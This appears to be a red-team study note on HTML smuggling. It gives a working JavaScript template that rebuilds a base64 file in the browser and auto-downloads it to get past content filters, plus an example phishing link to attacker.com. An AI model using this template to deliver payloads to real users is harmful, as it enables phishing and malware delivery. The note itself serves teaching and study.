---
description: 09/03/2025
---

# ✅ HTML Smuggling

## What is it?

HTML smuggling is a technique that uses JavaScript to hide files from content filters.&#x20;

If you send a phishing email with a download link, the `HTML` will probably look something like this:

```html
<a href="http://attacker.com/file.doc">Download Me</a>
```

### Security Implications

As a result, Email and web scanners are capable of parsing this data out and taking action upon it. They may be removed entirely, or the URL content fetched can be scanned by an AV sandbox.

### How to get Around This...

`HTML` smuggling allows us to get around this by embedding the payload into the `HTML` source code and using JavaScript to construct URLs by the browser at runtime.

### Boiler Plate Template

```html
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```

#### How does it work?

As this goes "across the wire", a scanner (or other security solution) will only be capable of seeing the `HTML` and JavaScript. There are no hardcoded hyperlinks and the content type of the page itself is just `text/html`.

The encoded content in the `file` variable was created simply with:

```
ubuntu@DESKTOP-3BSK7NO ~> echo -en "This is a smuggled file" | base64
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

As you can see in the screenshot above, the `base64`-encoded string, `VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=`, can be decoded to `"This is a smuggled file"`. &#x20;

### What happens when you host this HTML on a page?

Upon a victim user visiting the page, the browser will automatically reconstruct and download the file without any user interaction from the user.

The quickest way we can test this and stand this up is by using `python3 -m http.server`.&#x20;

From there, we now have a simple, insecure `HTTP` server that we can use to host this file.

Upon visiting, we see that we can perform a drive-by download-like attack as `test.txt` is automatically downloaded.&#x20;

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**The output from the Python `HTTP` server:**

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### MOTW Warning

Files downloaded this way will still retain the MOTW and are also subject to the typical browser restrictions (e.g. warnings when trying to download `.EXE`'s).

```
PS C:\Users\bfarmer\Downloads> gc .\test.txt -Stream Zone.Identifier
[ZoneTransfer]
ZoneId=3
ReferrerUrl=http://nickelviper.com/smuggle.html
HostUrl=http://nickelviper.com/
```
